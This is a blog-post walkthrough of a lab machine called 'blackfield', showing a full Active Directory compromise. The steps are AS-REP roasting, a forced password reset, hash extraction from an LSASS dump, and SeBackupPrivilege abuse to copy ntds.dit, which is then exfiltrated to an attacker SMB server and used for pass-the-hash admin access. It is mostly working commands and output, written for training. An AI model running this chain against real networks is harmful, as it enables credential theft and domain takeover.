---
layout: post
title: "blackfield"
date: 2025-10-16 
categories: CPTS Playlist
---
# blackfield

# Summary

- SMB null authentication is available
- nxc rid-brute to get valid users list
- nxc asreproast with valid users to get **AS-REP**
- crack ASREP to get user support’s password
- bloodhound to map out ad
- support has forcechangepassword over user audit2022
- audit2022 has read permission on forensic share; has lsass memory dump
- smbclient to get file; pypykatz to read lsass to get svc_backup NT hash
- bloodhound reveal user is in backup operator group
- we have SeBackupPrivilege; copy C drive to E:\, get ntds.dit, system registry drive to read NT hashes (administrator) from ntds.dit.
- we have administrator hash; evil-winrm

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/blackfield 10.10.10.192

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-16 23:01:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

```

From the nmap output, it looks to be a Windows domain. Let’s add the domain name to our /etc/hosts file:

```bash
10.10.10.192 blackfield.local
```

## SMB

Let’s try null authentication:

```bash
nxc smb 10.10.10.192 -u 'any' -p '' --shares

SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\any: (Guest)
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
```

It’s allowed. The non-default share we have read access to is profiles$. Let’s read that:

```bash
nxc smb 10.10.10.192 -u 'any' -p '' --spider profiles$ --regex .
```

![image.png]({{ site.baseurl }}/assets/blackfield/image.png)

It seems to be a bunch of users. Let’s see of we can connect to rpcclient, so we can get a list of valid users:

```bash
rpcclient -U'%' 10.10.10.192

result was NT_STATUS_ACCESS_DENIED
```

Let’s try using rid-brute:

```bash
nxc smb 10.10.10.192 -u 'any' -p '' --rid-brute 6000
```

Let’s format the output and put it into a file:

```bash
grep BLACKFIELD rid-brute.txt | awk '{print $6}' | awk -F\\ '{print $2}' | sort -u | grep -v '\$$' | tr '[:upper:]' '[:lower:]' > ad_users.txt
```

## Asreproast

Now let’s see if any of the users are asreproastable:

```bash
nxc ldap 10.10.10.192 -u ad_users.txt -p '' --asreproast asreproast.out

LDAP        10.10.10.192    389    DC01             $krb5asrep$23$support@BLACKFIELD.LOCAL:c716c3503c1d7111768ad01d3d73b3ef$50afe194ef6e4c5b9b7f69a34f811743bea2e7f4c096241bcc0a1c584c75fc721308f4351024591d5b1b009cc3ef9493f67afa6ac32feb0d696020430b265eea6b73dccef2d052fb0fd382e86a19833f32494458856407d5b3f72f09567e263904fe84f1283e2e1175166e8d26e4a2e2378cf1acab2db0feec31c52a8c1e29ae68be5042cca68ae71811008a483570ec0b6885ff9c7a5d742ecddfb06546d82e1c31eaa6be4f92ab287c38ea7a1338f3fb2717db91639b47fc2ff1c435367220e0e0736c381b8caff6b336b9b9ccfcddb166455edab6d50281dd5219abfaa2cf13be8453d0599c611de871b50f15d6c2e8d16b1e
```

Let’s see if we can crack the hash for user support. Put the hash into a file and:

```bash
.\hashcat.exe -m 18200 ..\hashes.txt ..\rockyou.txt

support:#00^BlackKnight
```

Let’s see if this is a valid user account:

```bash
nxc smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares

SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```

## Bloodhound

We have a valid AD account. Let’s map out the AD now:

```bash
mkdir bh_out
bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all

sudo neo4j start

bloodhound
```

After uploading our json files, let’s search for our user support:

![image.png]({{ site.baseurl }}/assets/blackfield/image%201.png)

It seems we have ForceChangePassword on audit2020 account. Let’s change their password and see what privileges they own.

```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"

net rpc password "audit2020" "newP@ssword2022" -U "blackfield"/"support"%"#00^BlackKnight" -S "10.10.10.192"
```

Now verify the changes:

```bash
nxc smb 10.10.10.192 -u audit2020 -p "newP@ssword2022" --shares

SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:newP@ssword2022 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```

It seems we have read permission over forensic file share. In bloodhound we do not see any additional group or other outbound control privileges. Let’s see what files are in forensic:

```bash
nxc smb 10.10.10.192 -u audit2020 -p "newP@ssword2022" --spider forensic --regex .
```

It seems this drive contains forensic artefacts. It has lsass in RAM, this could contain passwords:

![image.png]({{ site.baseurl }}/assets/blackfield/image%202.png)

Let’s download the zip file:

```bash
smbclient //10.10.10.192/forensic -U audit2020%"newP@ssword2022"

cd memory_anlaysis

get lsass.zip
```

Let’s use pypykatz to read the dump:

```bash
pypykatz lsa minidump lsass.DMP > lsass.out
```

Now let’s filter for the NT hashes. Let’s filter for administrator

```bash
grep NT lsass.out -B3 | grep -i Administrator -B5

                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: Administrator

```

Let’s see if we can logon as Administrator:

```bash
nxc smb 10.10.10.192 -u Administrator -H b624dc83a27cc29da11d9bf25efea796 --shares
```

Denied. Another user we saw in the file is svc_backup. Let’s see if this credential is valid:

```bash
 grep NT lsass.out -B3 | grep -i svc_backup -C10
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
--
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: DC01$
--
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
--
                Username: DC01$
                Domain: BLACKFIELD
                LM: NA
                NT: b624dc83a27cc29da11d9bf25efea796
--
                Username: DC01$

```

```bash
nxc smb 10.10.10.192 -u svc_backup -H b624dc83a27cc29da11d9bf25efea796 --shares
```

Denied.

```bash
nxc smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d --shares

SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$          READ            Remote Admin
SMB         10.10.10.192    445    DC01             C$              READ,WRITE      Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share                                         SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
```

Success. We have read/write permissions on C$. Let’s see what privileges we have on bloodhound:

![image.png]({{ site.baseurl }}/assets/blackfield/image%203.png)

We are a member of backup operator and remote management. This means we can login via winrm. Membership of Backup Operators group grants its members the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents. We can try and get NTDS.dit.

## Privilege Escalation

NTDS.dit is *locked* by the system (LSASS) so you can’t read it directly. The usual reliable method is:

1. Create a **Volume Shadow Copy** (VSS) so you get a *consistent, readable snapshot* of the drive.
2. **Expose** that shadow as a drive letter (E:) so normal file APIs can read it.
3. Use backup-mode copy (or use SeBackupPrivilege) to copy `ntds.dit` from the exposed snapshot into a local path you can access (C:\Users\svc_backup\Documents\ntds.dit).
4. Transfer that copied file off the box (SMB).
    
    This avoids trying to read the live, locked file and avoids inconsistent / corrupted snapshots.
    

Let’s log on using evil-winrm:

```bash
evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
```

![image.png]({{ site.baseurl }}/assets/blackfield/image%204.png)

First, we have to import these PS modules for copying files later: https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

Upload the following:

```bash
upload SeBackupPrivilegeUtils.dll

upload SeBackupPrivilegeCmdLets.dll
```

Now import both modules:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

Now let’s use diskshadow utility. First create our script, since the script needs to be in a very specific format, **UTF-16LE with BOM,** we need to do this on our winrm sessoin:

```bash
Set-Content -Path script.txt -Value "SET METADATA C:\Windows\Temp\meta.cab"
Add-Content -Path script.txt -Value "set context clientaccessible"
Add-Content -Path script.txt -Value "set context persistent"
Add-Content -Path script.txt -Value "begin backup"
Add-Content -Path script.txt -Value "add volume C: alias cdrive"
Add-Content -Path script.txt -Value "create"
Add-Content -Path script.txt -Value "expose %cdrive% E:"
Add-Content -Path script.txt -Value "end backup"
Add-Content -Path script.txt -Value "exit"
```

Now let’s execute it:

```bash
diskshadow /s script.txt

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  10/16/2025 5:16:19 PM

-> SET METADATA C:\Windows\Temp\meta.cab
-> set context clientaccessible
-> set context persistent
-> begin backup
-> add volume C: alias cdrive
-> create
Alias cdrive for shadow ID {c8e699ee-5754-47d2-8958-5b6c4cd9288d} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {37473471-7399-4f49-b63a-030747186ac1} set as environment variable.

Querying all shadow copies with the shadow copy set ID {37473471-7399-4f49-b63a-030747186ac1}

        * Shadow copy ID = {c8e699ee-5754-47d2-8958-5b6c4cd9288d}               %cdrive%
                - Shadow copy set: {37473471-7399-4f49-b63a-030747186ac1}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 10/16/2025 5:16:33 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {c8e699ee-5754-47d2-8958-5b6c4cd9288d}
The shadow copy was successfully exposed as E:\.
-> end backup
-> exit
```

Now let’s check if the E drive exists:

```bash
dir E:\
```

![image.png]({{ site.baseurl }}/assets/blackfield/image%205.png)

Now let’s copy ntds.dit back to C drive, with our SeBackupPrivilege:

```bash
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\svc_backup\Documents\ntds.dit
```

We also need the SYSTEM registry to decrypt. Let’s also get SAM as well:

```bash
reg save HKLM\SYSTEM system
reg save HKLM\SAM sam
```

Now let’s transfer everything back:

```bash
#on attack 
sudo impacket-smbserver share -smb2support . -user test -password test

#on target
#With Authentication:
net use \\10.10.16.4\share /user:test test
#Now we can just copy as normal
copy C:\Users\svc_backup\Documents\ntds.dit  \\10.10.16.4\share\ntds.dit

copy C:\Users\svc_backup\Documents\system \\10.10.16.4\share\system

copy C:\Users\svc_backup\Documents\sam \\10.10.16.4\share\sam
```

Now let’s read it with secretsdump:

```bash
impacket-secretsdump -ntds ntds.dit -system system -sam sam LOCAL > nt-hashes.txt
```

Now let’s get the administrator hash:

```bash
cat nt-hashes.txt | grep Administrator

Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

Looking in the file, we want the domain admin, not local, so the second one is the administrator we want. Now let’s verify credential:

```bash
evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
```

![image.png]({{ site.baseurl }}/assets/blackfield/image%206.png)

We are administrator.